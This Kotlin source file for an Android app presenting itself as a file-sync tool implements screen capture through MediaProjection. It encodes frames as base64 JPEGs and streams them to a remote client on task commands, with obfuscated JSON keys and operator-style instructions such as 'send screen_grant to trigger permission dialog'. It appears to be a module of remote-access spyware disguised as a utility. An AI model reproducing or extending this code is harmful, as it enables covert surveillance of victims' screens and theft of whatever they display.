package com.georgetech.filesync.modules

import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import android.util.DisplayMetrics
import android.view.WindowManager
import com.georgetech.filesync.SyncAdapter
import com.georgetech.filesync.Crypt
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.LinkedBlockingQueue
import java.util.concurrent.TimeUnit

class DisplayHelper(private val context: Context) {

    companion object {
        @Volatile var projection: MediaProjection? = null
        var resultCode: Int = 0
        var resultData: Intent? = null

        @Volatile private var vdThread: HandlerThread? = null
        @Volatile private var vdHandler: Handler? = null
        @Volatile private var imgReader: ImageReader? = null
        @Volatile private var virtDisplay: VirtualDisplay? = null
        @Volatile var capWidth = 0
        @Volatile var capHeight = 0
        @Volatile private var capturing = false
        private val frameQ = LinkedBlockingQueue<ByteArray>(3)

        @Synchronized
        fun setupCapture(proj: MediaProjection, metrics: DisplayMetrics) {
            teardown()
            val w = metrics.widthPixels / 2
            val h = metrics.heightPixels / 2
            val dpi = metrics.densityDpi

            val t = HandlerThread("sk_c").apply { start() }
            val h2 = Handler(t.looper)

            val reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
            reader.setOnImageAvailableListener({ r ->
                if (!capturing) {
                    r.acquireLatestImage()?.close()
                    return@setOnImageAvailableListener
                }
                val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                try {
                    val planes = img.planes
                    val buf = planes[0].buffer
                    val ps = planes[0].pixelStride
                    val rs = planes[0].rowStride
                    // rs/ps gives the actual stride width — handles Samsung row alignment padding
                    val bmpW = rs / ps
                    val bmp = Bitmap.createBitmap(bmpW, h, Bitmap.Config.ARGB_8888)
                    bmp.copyPixelsFromBuffer(buf)
                    val crop = if (bmpW > w) {
                        Bitmap.createBitmap(bmp, 0, 0, w, h).also { bmp.recycle() }
                    } else bmp
                    val baos = ByteArrayOutputStream()
                    crop.compress(Bitmap.CompressFormat.JPEG, 60, baos)
                    crop.recycle()
                    frameQ.offer(baos.toByteArray())
                } finally {
                    img.close()
                }
            }, h2)

            val vd = proj.createVirtualDisplay(
                "sk_vd", w, h, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                reader.surface, null, h2
            )

            proj.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    teardown()
                }
            }, h2)

            vdThread = t
            vdHandler = h2
            imgReader = reader
            virtDisplay = vd
            capWidth = w
            capHeight = h
        }

        @Synchronized
        fun teardown() {
            capturing = false
            frameQ.clear()
            virtDisplay?.release()
            virtDisplay = null
            imgReader?.close()
            imgReader = null
            vdThread?.quitSafely()
            vdThread = null
            vdHandler = null
            projection = null
        }

        fun isReady() = projection != null && virtDisplay != null
    }

    private fun k(e: String) = Crypt.d(e)

    private fun getMetrics(): DisplayMetrics {
        val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getRealMetrics(metrics)
        return metrics
    }

    fun capture(): JSONObject {
        if (!isReady()) return JSONObject().apply {
            put(k("PykuMiw="), "grant_required")
            put(k("NDQoOA=="), "send 'screen_grant' to trigger permission dialog")
        }
        frameQ.clear()
        capturing = true
        val bytes = frameQ.poll(3, TimeUnit.SECONDS)
        capturing = false
        return if (bytes != null) {
            JSONObject().apply {
                put(k("KS89KSss"), "captured")
                put("width", capWidth)
                put("height", capHeight)
                put(k("KTImOA=="), bytes.size)
                put(k("PjooPA=="), Base64.encodeToString(bytes, Base64.NO_WRAP))
            }
        } else {
            JSONObject().put(k("PykuMiw="), "capture_timeout")
        }
    }

    fun stream(client: SyncAdapter, taskId: String, intervalMs: Int, frameCount: Int): JSONObject {
        if (!isReady()) return JSONObject().apply {
            put(k("PykuMiw="), "grant_required")
        }
        var sent = 0
        for (i in 0 until frameCount) {
            if (!isReady()) break
            frameQ.clear()
            capturing = true
            val bytes = frameQ.poll(3, TimeUnit.SECONDS)
            capturing = false
            if (bytes != null) {
                try {
                    client.sendResult(taskId, JSONObject().apply {
                        put("frame", i)
                        put("total", frameCount)
                        put(k("PjooPA=="), Base64.encodeToString(bytes, Base64.NO_WRAP))
                        put(k("KTImOA=="), bytes.size)
                    })
                    sent++
                } catch (_: Exception) {}
            }
            if (i < frameCount - 1) {
                try { Thread.sleep(intervalMs.toLong()) } catch (_: Exception) { break }
            }
        }
        return JSONObject().apply {
            put(k("KS89KSss"), "stream_done")
            put("frames_sent", sent)
            put("frames_requested", frameCount)
        }
    }
}
